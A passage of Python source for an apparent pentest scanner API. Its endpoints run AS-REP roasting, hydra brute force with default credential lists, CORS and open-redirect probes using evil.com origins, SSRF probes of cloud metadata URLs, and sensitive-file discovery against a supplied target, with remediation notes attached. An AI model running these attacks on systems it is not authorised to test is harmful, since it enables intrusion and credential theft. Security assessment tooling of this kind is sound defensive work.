            "remediation": "Restrict Kerberos ticket reuse. Implement short ticket lifetimes."})
        # Try AS-REP Roasting (no pre-auth)
        asrep = await run_tool(
            ["python3", "-m", "impacket.examples.GetNPUsers",
             f"{req.domain}/", "-dc-ip", host, "-no-pass", "-usersfile", "/usr/share/wordlists/user.txt",
             "-format", "hashcat", "-outputfile", "/tmp/asrep.txt"],
            timeout=30)
        asrep_out = asrep.get("output", "")
        if "$krb5asrep$" in asrep_out:
            findings.append({"detail": "AS-REP Roasting possible — accounts without Kerberos pre-auth found",
                "severity": "CRITICAL", "cvss": "9.0", "cve": "N/A",
                "cwe": "CWE-294", "cwe_name": "AS-REP Roasting",
                "owasp": "A07:2021",
                "remediation": "Enable 'Do not require Kerberos preauthentication' = OFF for all accounts."})
    if ldap_open:
        findings.append({"detail": f"LDAP (port 389) open on {host} — enumerate users with ldapsearch",
            "severity": "MEDIUM", "cvss": "5.3", "cve": "N/A",
            "cwe": "CWE-294", "cwe_name": "LDAP Enumeration",
            "owasp": "A07:2021",
            "remediation": "Disable anonymous LDAP bind. Require authentication for all LDAP queries."})
    if not kerberos_open and not ldap_open:
        findings.append({"detail": "Kerberos/LDAP ports not detected — target may not be a Windows DC",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-294", "cwe_name": "Pass-the-Ticket",
            "owasp": "A07:2021",
            "remediation": "This attack applies to Windows Active Directory environments."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "ptt", req.target, sock_result)
    return {"scan_id": scan_id, "target": req.target, "tool": "impacket",
            "findings": findings, "total": len(findings), "raw_output": nmap_out,
            "kerberos_open": kerberos_open, "ldap_open": ldap_open,
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/auth/keylog")
async def auth_keylog(req: AuthRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    findings = []
    # Scan for common keylogger indicators via nmap scripts + process check
    nmap_result = await run_tool(
        ["nmap", "-sV", "-p", "22,3389,5985,5986", host, "-T4"], timeout=30)
    nmap_out = nmap_result.get("output", "")
    if "22/tcp" in nmap_out and "open" in nmap_out:
        findings.append({"detail": "SSH (port 22) open — post-exploitation keylogging possible via PTY hijacking",
            "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
            "cwe": "CWE-200", "cwe_name": "Keylogging",
            "owasp": "A07:2021",
            "remediation": "Use SSH key-based auth. Monitor for /proc/<pid>/fd access patterns."})
    if "3389/tcp" in nmap_out and "open" in nmap_out:
        findings.append({"detail": "RDP (port 3389) open — keylogging via RDP session injection possible",
            "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
            "cwe": "CWE-200", "cwe_name": "Keylogging",
            "owasp": "A07:2021",
            "remediation": "Enable Network Level Authentication (NLA). Use RDP gateway."})
    if "5985/tcp" in nmap_out and "open" in nmap_out:
        findings.append({"detail": "WinRM (port 5985) open — PowerShell keylogger deployment possible if credentials obtained",
            "severity": "MEDIUM", "cvss": "6.5", "cve": "N/A",
            "cwe": "CWE-200", "cwe_name": "Keylogging",
            "owasp": "A07:2021",
            "remediation": "Restrict WinRM access. Use HTTPS (5986). Require Kerberos auth."})
    if not findings:
        findings.append({"detail": "No remote access ports open for keylogger deployment — attack requires prior access",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-200", "cwe_name": "Keylogging",
            "owasp": "A07:2021",
            "remediation": "Deploy EDR solution. Monitor for SetWindowsHookEx API calls."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "keylog", req.target, nmap_result)
    return {"scan_id": scan_id, "target": req.target, "tool": "keylog_detect",
            "findings": findings, "total": len(findings), "raw_output": nmap_out,
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  PROMPT 10 — DATA & BUSINESS LOGIC
#  Data Exfiltration, Race Condition
# ══════════════════════════════════════════════════════════════

@app.post("/api/scan/dataexfil")
async def scan_dataexfil(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    target_url = req.target if req.target.startswith("http") else "http://" + req.target
    try:
        r = _req_lib.get(target_url, timeout=10, verify=False, allow_redirects=True)
        # Check for sensitive data in response
        patterns = {
            "Credit Card": r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b",
            "SSN": r"\b\d{3}-\d{2}-\d{4}\b",
            "Email Address": r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",
            "Private Key": r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
            "AWS Key": r"AKIA[0-9A-Z]{16}",
            "Password in HTML": r'(?:password|passwd|pwd)["\s]*[=:]["\s]*[^\s"<>]{4,}',
            "Internal IP": r"\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b",
            "API Key": r'(?:api[_-]?key|apikey|api[_-]?secret)["\s]*[=:]["\s]*["\']?([A-Za-z0-9\-_]{16,})',
        }
        for name, pattern in patterns.items():
            matches = re.findall(pattern, r.text, re.IGNORECASE)
            if matches:
                sample = str(matches[0])[:40]
                findings.append({"detail": f"Potential data exposure: {name} found in response (sample: {sample}...)",
                    "severity": "CRITICAL" if name in ["Credit Card","SSN","Private Key","AWS Key"] else "HIGH",
                    "cvss": "9.1", "cve": "N/A",
                    "cwe": "CWE-200", "cwe_name": "Data Exposure",
                    "owasp": "A02:2021",
                    "remediation": f"Remove {name} from HTTP responses. Mask sensitive fields."})
        # Check DNS for exfil indicators
        host = _recon_host(target_url)
        dns_result = await run_tool(["dig", "+short", "TXT", host], timeout=10)
        dns_out = dns_result.get("output", "")
        if len(dns_out) > 200:
            findings.append({"detail": "Unusually large DNS TXT records — potential DNS tunneling/exfiltration channel",
                "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                "cwe": "CWE-200", "cwe_name": "Data Exfiltration",
                "owasp": "A02:2021",
                "remediation": "Monitor DNS queries. Block large TXT record responses at firewall."})
        if not findings:
            findings.append({"detail": "No obvious data exposure in HTTP response — check authenticated endpoints",
                "severity": "INFO", "cvss": "0.0", "cve": "N/A",
                "cwe": "CWE-200", "cwe_name": "Data Exposure",
                "owasp": "A02:2021", "remediation": "Review all API endpoints for sensitive data leakage."})
    except Exception as e:
        findings.append({"detail": f"Scan error: {e}", "severity": "INFO", "cvss": "0.0",
            "cve": "N/A", "cwe": "N/A", "cwe_name": "Scan Error",
            "owasp": "N/A", "remediation": "Check target."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dataexfil", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "dataexfil",
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/racecondition")
async def scan_racecondition(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    target_url = req.target if req.target.startswith("http") else "http://" + req.target
    import concurrent.futures, time as _t
    CONCURRENT = 10
    ROUNDS = 3

    def send_request(url, session):
        try:
            r = session.get(url, timeout=5, verify=False)
            return r.status_code, len(r.text), r.elapsed.total_seconds()
        except:
            return None, 0, 0

    status_counts = {}
    response_sizes = []
    try:
        s = _req_lib.Session()
        for _ in range(ROUNDS):
            with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT) as ex:
                futures = [ex.submit(send_request, target_url, s) for _ in range(CONCURRENT)]
                results = [f.result() for f in concurrent.futures.as_completed(futures)]
            for code, size, elapsed in results:
                if code:
                    status_counts[code] = status_counts.get(code, 0) + 1
                    response_sizes.append(size)
        unique_sizes = len(set(response_sizes))
        total = sum(status_counts.values())
        if unique_sizes > 3:
            findings.append({"detail": f"Race condition indicator: {unique_sizes} different response sizes from {total} concurrent requests",
                "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                "cwe": "CWE-362", "cwe_name": "Race Condition",
                "owasp": "A04:2021",
                "remediation": "Use atomic database transactions. Implement mutex/locking for critical operations."})
        if 200 in status_counts and 500 in status_counts:
            findings.append({"detail": "Server errors (500) under concurrent load — possible race condition or resource exhaustion",
                "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                "cwe": "CWE-362", "cwe_name": "Race Condition",
                "owasp": "A04:2021",
                "remediation": "Implement request queuing. Use database-level locking for state changes."})
        if not findings:
            findings.append({"detail": f"No race condition detected ({total} concurrent requests sent, consistent responses)",
                "severity": "INFO", "cvss": "0.0", "cve": "N/A",
                "cwe": "CWE-362", "cwe_name": "Race Condition",
                "owasp": "A04:2021",
                "remediation": "Test on authenticated state-changing endpoints (e.g. /transfer, /coupon, /vote)."})
        findings.append({"detail": f"Race condition test stats: {total} requests, status codes: {status_counts}, unique response sizes: {unique_sizes}",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "CWE-362", "cwe_name": "Race Condition",
            "owasp": "A04:2021", "remediation": "Review all endpoints that modify shared state."})
    except Exception as e:
        findings.append({"detail": f"Scan error: {e}", "severity": "INFO", "cvss": "0.0",
            "cve": "N/A", "cwe": "N/A", "cwe_name": "Scan Error",
            "owasp": "N/A", "remediation": "Check target."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "racecondition", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "racecondition",
            "findings": findings, "total": len(findings),
            "status_distribution": status_counts,
            "timestamp": datetime.datetime.utcnow().isoformat()}



# ══════════════════════════════════════════════════════════════
#  ALL MISSING SCAN ENDPOINTS — append to main.py
# ══════════════════════════════════════════════════════════════

# ── WAF DETECTION ─────────────────────────────────────────────
@app.post("/api/scan/wafw00f")
async def scan_wafw00f(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["wafw00f", req.target, "-a"], timeout=60)
    out = result.get("output", "")
    findings = []
    detected = False
    waf_name = "Unknown"
    for line in out.splitlines():
        if "is behind" in line.lower():
            detected = True
            m = re.search(r"behind\s+(.+)", line, re.IGNORECASE)
            if m: waf_name = m.group(1).strip()
            findings.append({"detail": f"WAF detected: {waf_name}", "severity": "INFO", "cvss": "0.0",
                "cve": "N/A", "cwe": "N/A", "cwe_name": "WAF Detected", "owasp": "A05:2021",
                "remediation": "WAF detected — may need bypass techniques for pentest."})
        if "no waf" in line.lower() or "not behind" in line.lower():
            findings.append({"detail": "No WAF detected — target is unprotected", "severity": "MEDIUM",
                "cvss": "5.3", "cve": "N/A", "cwe": "CWE-693", "cwe_name": "No WAF Protection",
                "owasp": "A05:2021", "remediation": "Deploy a WAF (ModSecurity, Cloudflare, AWS WAF)."})
    if not findings:
        findings.append({"detail": "WAF detection inconclusive", "severity": "INFO", "cvss": "0.0",
            "cve": "N/A", "cwe": "N/A", "cwe_name": "WAF Check", "owasp": "A05:2021",
            "remediation": "Run wafw00f manually for full results."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "wafw00f", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "wafw00f",
            "detected": detected, "waf_name": waf_name if detected else None,
            "findings": findings, "total": len(findings), "raw_output": out,
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── TECH FINGERPRINTING ────────────────────────────────────────
@app.post("/api/scan/whatweb")
async def scan_whatweb(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["whatweb", "--color=never", "--no-errors", "-a", "3", req.target], timeout=60)
    out = result.get("output", "")
    techs = []
    findings = []
    patterns = [
        (r"WordPress[\s/]+([\d.]+)", "WordPress", "HIGH", "Update WordPress and plugins."),
        (r"Joomla[\s/]+([\d.]+)", "Joomla", "HIGH", "Update Joomla to latest version."),
        (r"Drupal[\s/]+([\d.]+)", "Drupal", "HIGH", "Apply all Drupal security patches."),
        (r"Apache[\s/]+([\d.]+)", "Apache", "MEDIUM", "Update Apache. Disable server signature."),
        (r"nginx[\s/]+([\d.]+)", "nginx", "LOW", "Update nginx. Remove version from Server header."),
        (r"PHP[\s/]+([\d.]+)", "PHP", "MEDIUM", "Update PHP. Disable version exposure."),
        (r"jQuery[\s/]+(1\.[0-9]+|2\.[0-9]+)", "jQuery (outdated)", "MEDIUM", "Update jQuery to v3.x+."),
    ]
    for line in out.splitlines():
        for pattern, tech, sev, rem in patterns:
            m = re.search(pattern, line, re.IGNORECASE)
            if m:
                ver = m.group(1) if m.lastindex and m.lastindex >= 1 else ""
                techs.append({"name": tech, "version": ver})
                findings.append({"detail": f"{tech} {ver} detected — verify up to date",
                    "severity": sev, "cvss": "7.5" if sev == "HIGH" else "5.3" if sev == "MEDIUM" else "3.1",
                    "cve": "N/A", "cwe": "CWE-1035", "cwe_name": "Vulnerable Components",
                    "owasp": "A06:2021", "remediation": rem})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "whatweb", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "whatweb",
            "technologies": techs, "findings": findings, "total": len(findings),
            "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()}


# ── PORT SCAN (scan module alias) ─────────────────────────────
@app.post("/api/scan/nmap")
async def scan_nmap_alias(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    # Use common ports for speed; add full scan only if needed
    result = await run_tool(
        ["nmap", "-sV", "-sC", "-T4", "--open",
         "-p", "21,22,23,25,53,80,443,445,8080,8443,3306,3389,5432,5900,6379,27017,9200,1433",
         host], timeout=120)
    out = result.get("output", "")
    ports = []
    current = None
    for line in out.splitlines():
        m = re.match(r"(\d+)/(tcp|udp)\s+(\w+)\s+(\S+)\s*(.*)", line.strip())
        if m:
            port, proto, state, service, version = m.groups()
            current = {"port": int(port), "protocol": proto, "state": state,
                "service": service, "version": version.strip(), "scripts": []}
            ports.append(current)
        elif current and re.match(r"\|[_\s]", line):
            s = re.sub(r"^\|[_\s]*", "", line).strip()
            if s: current["scripts"].append(s)
    findings = []
    risky = {"21": "FTP (cleartext)", "23": "Telnet (cleartext)", "3389": "RDP",
             "445": "SMB", "139": "NetBIOS", "5900": "VNC", "6379": "Redis (unauthenticated)"}
    for p in ports:
        if str(p["port"]) in risky:
            findings.append({"detail": f"{risky[str(p['port'])]} open on port {p['port']}",
                "severity": "HIGH", "cvss": "7.5", "cve": "N/A", "cwe": "CWE-200", "cwe_name": "Open Port",
                "owasp": "A05:2021", "remediation": f"Firewall port {p['port']}. Disable if unused."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "nmap_scan", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "nmap",
            "ports": ports, "total_open": len(ports), "findings": findings,
            "raw_output": out, "command": result.get("cmd", ""),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── GOBUSTER (scan alias) ──────────────────────────────────────
@app.post("/api/scan/gobuster")
async def scan_gobuster_alias(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["gobuster", "dir", "-u", req.target, "-w",
        "/usr/share/wordlists/dirb/common.txt", "-t", "20", "-q", "--no-progress"], timeout=120)
    out = result.get("output", "")
    found = []
    findings = []
    for line in out.splitlines():
        m = re.match(r"(/\S+)\s+\(Status:\s*(\d+)\)", line.strip())
        if m:
            path, status = m.group(1), int(m.group(2))
            found.append({"path": path, "status": status})
            if status in [200, 301, 302]:
                findings.append({"detail": f"Directory: {path} (HTTP {status})", "severity": "LOW",
                    "cvss": "3.1", "cve": "N/A", "cwe": "CWE-538", "cwe_name": "Directory Exposure",
                    "owasp": "A01:2021", "remediation": "Restrict access to sensitive directories."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "gobuster", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "gobuster",
            "found": found, "findings": findings, "total": len(found),
            "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()}


# ── SUBDOMAINS (scan alias) ────────────────────────────────────
@app.post("/api/scan/subdomains")
async def scan_subdomains_alias(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["sublist3r", "-d", host, "-t", "5", "-o", "/dev/null"], timeout=120)
    out = result.get("output", "")
    subdomains = list(dict.fromkeys([l.strip() for l in out.splitlines()
        if l.strip() and host in l and not l.startswith("[")]))
    findings = [{"detail": f"Subdomain: {s}", "severity": "INFO", "cvss": "0.0",
        "cve": "N/A", "cwe": "CWE-200", "cwe_name": "Information Disclosure",
        "owasp": "A01:2021", "remediation": "Audit all subdomains."} for s in subdomains]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "subdomains", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "sublist3r",
            "subdomains": subdomains, "findings": findings, "total": len(subdomains),
            "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()}


# ── DNS (scan alias) ───────────────────────────────────────────
@app.post("/api/scan/dns")
async def scan_dns_alias(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["dnsrecon", "-d", host, "-t", "std"], timeout=60)
    out = result.get("output", "")
    records = []
    for line in out.splitlines():
        for rtype in ["A","AAAA","MX","NS","TXT","SOA","CNAME"]:
            if re.search(rf"\s+{rtype}\s+", line, re.IGNORECASE):
                records.append({"type": rtype, "value": line.strip()})
                break
    findings = [{"detail": f"DNS {r['type']}: {r['value'][:80]}", "severity": "INFO", "cvss": "0.0",
        "cve": "N/A", "cwe": "CWE-200", "cwe_name": "DNS Info",
        "owasp": "A05:2021", "remediation": "Review DNS for unintended disclosure."} for r in records]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dns", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "dnsrecon",
            "records": records, "findings": findings, "total": len(records),
            "raw_output": out, "timestamp": datetime.datetime.utcnow().isoformat()}


# ── CORS ──────────────────────────────────────────────────────
@app.post("/api/scan/cors")
async def scan_cors(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    # Test 1: baseline — check what the server returns with no Origin
    base_result = await run_tool(["curl", "-sk", "--max-time", "10", "-I", req.target], timeout=15)
    base_out = base_result.get("output", "")
    for line in base_out.splitlines():
        if "access-control-allow-origin" in line.lower():
            val = line.split(":", 1)[-1].strip()
            if val == "*":
                findings.append({"detail": f"CORS wildcard: Access-Control-Allow-Origin: * — any origin can read responses",
                    "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                    "cwe": "CWE-942", "cwe_name": "CORS Wildcard",
                    "owasp": "A05:2021",
                    "remediation": "Replace wildcard with specific trusted origins. Never use * with credentials."})
    # Test 2: reflect evil origin
    for origin in ["https://evil.com", "null", "https://attacker.com"]:
        result = await run_tool(["curl", "-sk", "--max-time", "10", "-I",
            "-H", f"Origin: {origin}", req.target], timeout=15)
        out = result.get("output", "")
        for line in out.splitlines():
            if "access-control-allow-origin" in line.lower():
                val = line.split(":", 1)[-1].strip()
                if "evil.com" in val or "attacker.com" in val or val == "null":
                    findings.append({"detail": f"CORS reflects arbitrary origin: {line.strip()}",
                        "severity": "CRITICAL", "cvss": "9.0", "cve": "N/A",
                        "cwe": "CWE-942", "cwe_name": "CORS Origin Reflection",
                        "owasp": "A05:2021",
                        "remediation": "Never reflect arbitrary Origin headers. Use strict allowlist."})
                    break
                if val == "*":
                    break  # already reported above
    if not findings:
        findings.append({"detail": "No CORS misconfiguration detected", "severity": "INFO",
            "cvss": "0.0", "cve": "N/A", "cwe": "CWE-942", "cwe_name": "CORS",
            "owasp": "A05:2021", "remediation": "CORS appears correctly configured."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "cors", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "cors",
            "vulnerable": any(f["severity"] in ("HIGH","CRITICAL") for f in findings),
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── ZAP ───────────────────────────────────────────────────────
@app.post("/api/scan/zap")
async def scan_zap(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["zap-cli", "--silent", "quick-scan", "--self-contained",
        "--start-options", "-config api.disablekey=true", "-r", req.target], timeout=180)
    out = result.get("output", "")
    findings = []
    for line in out.splitlines():
        if "WARN" in line or "FAIL" in line or "alert" in line.lower():
            sev = "HIGH" if "FAIL" in line else "MEDIUM"
            findings.append({"detail": line.strip()[:120], "severity": sev,
                "cvss": "7.5" if sev == "HIGH" else "5.3", "cve": "N/A",
                "cwe": "CWE-200", "cwe_name": "ZAP Alert",
                "owasp": "A05:2021", "remediation": "Apply OWASP remediation for this finding."})
    if not findings:
        findings.append({"detail": "ZAP scan complete — install zap-cli (pip install zapcli) for full results",
            "severity": "INFO", "cvss": "0.0", "cve": "N/A",
            "cwe": "N/A", "cwe_name": "ZAP Scan", "owasp": "N/A",
            "remediation": "Run OWASP ZAP GUI for comprehensive active scanning."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "zap", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "zap",
            "findings": findings, "total": len(findings), "raw_output": out,
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── SCAN HISTORY LIST ─────────────────────────────────────────
@app.get("/api/scans")
async def list_scans(user=Depends(verify_token)):
    return {"scans": list(reversed(SCAN_HISTORY)), "total": len(SCAN_HISTORY)}


# ── FFUF ──────────────────────────────────────────────────────
@app.post("/api/scan/ffuf")
async def ffuf_scan(req: ScanRequest, user=Depends(verify_token)):
    opts = req.options or {}
    mode = opts.get("mode", "dirs")
    wordlist = "/usr/share/wordlists/dirb/common.txt"
    base = req.target.rstrip("/")
    if mode == "vhosts":
        host = _recon_host(req.target)
        cmd = ["ffuf", "-w", wordlist, "-u", req.target, "-H", f"Host: FUZZ.{host}",
               "-mc", "200,301,302,403", "-of", "json", "-o", "/tmp/ffuf_out.json", "-t", "50", "-s"]
    elif mode == "params":
        url = req.target + ("?" if "?" not in req.target else "&") + "FUZZ=test"
        cmd = ["ffuf", "-w", wordlist, "-u", url, "-mc", "200,301,302",
               "-of", "json", "-o", "/tmp/ffuf_out.json", "-t", "50", "-s"]
    else:
        cmd = ["ffuf", "-w", wordlist, "-u", f"{base}/FUZZ",
               "-mc", "200,301,302,403", "-of", "json", "-o", "/tmp/ffuf_out.json", "-t", "50", "-s"]
    result = await run_tool(cmd, timeout=300)
    discovered = []
    try:
        with open("/tmp/ffuf_out.json") as f:
            data = json.load(f)
        for r in data.get("results", []):
            discovered.append({"path": r.get("input",{}).get("FUZZ",""),
                "url": r.get("url",""), "status": r.get("status",0), "size": r.get("length",0)})
    except Exception:
        for line in result.get("output","").split("\n"):
            m = re.match(r"\s+(\S+)\s+\[Status:\s*(\d+)", line)
            if m: discovered.append({"path": m.group(1), "status": int(m.group(2))})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "ffuf", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "ffuf", "mode": mode,
            "discovered": discovered, "total": len(discovered),
            "raw_output": result.get("output",""), "command": result.get("cmd",""),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── WPSCAN ────────────────────────────────────────────────────
@app.post("/api/scan/wpscan")
async def wpscan_scan(req: ScanRequest, user=Depends(verify_token)):
    cmd = ["wpscan", "--url", req.target, "--no-update", "--random-user-agent",
           "--format", "json", "--output", "/tmp/wpscan_out.json"]
    result = await run_tool(cmd, timeout=180)
    findings = []
    wp_version = "Unknown"
    try:
        with open("/tmp/wpscan_out.json") as f:
            data = json.load(f)
        wp_version = (data.get("version") or {}).get("number", "Unknown")
        for vuln in (data.get("vulnerabilities") or []):
            cves = (vuln.get("references") or {}).get("cve") or []
            findings.append({"detail": vuln.get("title","WordPress Vulnerability"),
                "severity": "HIGH", "cvss": "7.5", "cve": cves[0] if cves else "N/A",
                "cwe": "CWE-937", "cwe_name": "Outdated Component",
                "owasp": "A06:2021", "remediation": "Update WordPress to latest version."})
    except Exception:
        for line in result.get("output","").split("\n"):
            if "[!]" in line and "vulnerabilit" in line.lower():
                findings.append({"detail": line.strip().replace("[!]","").strip(),
                    "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                    "cwe": "CWE-937", "cwe_name": "Outdated Component",
                    "owasp": "A06:2021", "remediation": "Update WordPress and all plugins."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "wpscan", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "wpscan",
            "wp_version": wp_version, "findings": findings, "total": len(findings),
            "raw_output": result.get("output",""), "timestamp": datetime.datetime.utcnow().isoformat()}


# ── OPEN REDIRECT ─────────────────────────────────────────────
@app.post("/api/scan/openredirect")
async def openredirect_scan(req: ScanRequest, user=Depends(verify_token)):
    external = "https://evil.com"
    params = ["redirect","url","next","return","returnUrl","goto","dest","destination","link","redir","redirect_uri","callback","ref"]
    findings = []
    for param in params:
        url = f"{req.target}?{param}={external}"
        try:
            res = await run_tool(["curl","-sk","--max-time","5","-I","-L",url], timeout=10)
            out = res.get("output","").lower()
            if "location: https://evil.com" in out or "location: http://evil.com" in out:
                findings.append({"detail": f"Open redirect via ?{param}=",
                    "severity": "MEDIUM", "cvss": "6.1", "cve": "N/A",
                    "cwe": "CWE-601", "cwe_name": "Open Redirect",
                    "owasp": "A01:2021", "remediation": f"Whitelist redirect domains. Reject external URLs in ?{param}="})
        except Exception:
            pass
    if not findings:
        findings.append({"detail": "No open redirect detected", "severity": "INFO", "cvss": "0.0",
            "cve": "N/A", "cwe": "CWE-601", "cwe_name": "Open Redirect",
            "owasp": "A01:2021", "remediation": "Test authenticated redirect flows manually."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "openredirect", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "openredirect",
            "vulnerable": any(f["severity"] not in ("INFO",) for f in findings),
            "findings": findings, "total": len(findings),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── SENSITIVE FILES ────────────────────────────────────────────
@app.post("/api/scan/sensitivefiles")
async def sensitivefiles_scan(req: ScanRequest, user=Depends(verify_token)):
    wordlist = "/usr/share/wordlists/dirb/common.txt"
    base = req.target.rstrip("/")
    cmd = ["gobuster","dir","-u",base,"-w",wordlist,"-x",
           "php,bak,zip,sql,log,env,conf,txt,xml,json,old,backup,swp",
           "-t","30","--timeout","10s","-q","-s","200,301,302","--no-error"]
    result = await run_tool(cmd, timeout=240)
    sensitive = [".env",".git","backup",".bak",".sql","config","passwd","phpinfo",".zip",".log","install","setup"]
    findings = []
    discovered = []
    for line in result.get("output","").split("\n"):
        m = re.match(r"(/\S+)\s+\(Status:\s*(\d+)", line)
        if m:
            path, status = m.group(1), int(m.group(2))
            discovered.append({"path": path, "status": status})
            if any(p in path.lower() for p in sensitive):
                findings.append({"detail": f"Sensitive file: {path} (HTTP {status})",
                    "severity": "HIGH", "cvss": "7.5", "cve": "N/A",
                    "cwe": "CWE-538", "cwe_name": "Sensitive File Exposure",
                    "owasp": "A05:2021", "remediation": f"Remove or restrict {path}."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "sensitivefiles", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "sensitivefiles",
            "vulnerable": len(findings) > 0, "findings": findings, "discovered": discovered,
            "total": len(findings), "raw_output": result.get("output",""),
            "timestamp": datetime.datetime.utcnow().isoformat()}


# ── HYDRA (scan endpoint) ─────────────────────────────────────
@app.post("/api/scan/hydra")
async def hydra_scan(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    with open("/tmp/hydra_users.txt","w") as f:
        f.write("admin\nadministrator\nroot\nuser\ntest\nguest\nmanager\n")
    with open("/tmp/hydra_pass.txt","w") as f:
        f.write("admin\npassword\n123456\nadmin123\npassword123\ntest\nroot\nguest\nletmein\nqwerty\n")
    cmd = ["hydra","-L","/tmp/hydra_users.txt","-P","/tmp/hydra_pass.txt",
           "-f","-t","4","-timeout","5",host,"http-get","/","-o","/tmp/hydra_out.txt"]
    result = await run_tool(cmd, timeout=120)
    findings = []
    try:
        with open("/tmp/hydra_out.txt") as f:
            for line in f:
                if "login:" in line.lower() and "password:" in line.lower():
                    findings.append({"detail": f"Weak credentials found: {line.strip()}",
                        "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A",
                        "cwe": "CWE-521", "cwe_name": "Weak Password",
                        "owasp": "A07:2021", "remediation": "Enforce strong passwords. Implement lockout."})
    except Exception:
        pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "hydra", req.target, result)
    return {"scan_id": scan_id, "target": req.target, "tool": "hydra",
            "vulnerable": len(findings) > 0, "findings": findings, "total": len(findings),
            "raw_output": result.get("output",""), "timestamp": datetime.datetime.utcnow().isoformat()}


# ── SSRF ──────────────────────────────────────────────────────
@app.post("/api/scan/ssrf")
async def ssrf_scan(req: ScanRequest, user=Depends(verify_token)):
    internal = ["http://127.0.0.1/","http://localhost/","http://169.254.169.254/latest/meta-data/"]
    params = ["url","path","dest","redirect","uri","load","fetch","src","href","link"]
    findings = []
    indicators = ["root:","private","admin","apache","nginx","it works","ami-id","instance-id"]
    for param in params[:5]:
        for t_url in internal[:2]:
            url = f"{req.target}?{param}={t_url}"
            try:
                res = await run_tool(["curl","-sk","--max-time","5",url], timeout=10)
                if any(ind in res.get("output","").lower() for ind in indicators):
                    findings.append({"detail": f"SSRF: ?{param}= fetched {t_url}",
                        "severity": "HIGH", "cvss": "8.6", "cve": "N/A",
                        "cwe": "CWE-918", "cwe_name": "SSRF",
                        "owasp": "A10:2021", "remediation": "Validate URLs against allowlist. Block RFC1918."})
                    break
            except Exception:
                pass
    if not findings:
        findings.append({"detail": "No SSRF detected across tested parameters", "severity": "INFO",
            "cvss": "0.0", "cve": "N/A", "cwe": "CWE-918", "cwe_name": "SSRF",
            "owasp": "A10:2021", "remediation": "Test with authenticated requests."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "ssrf", req.target, {"output": str(findings)})
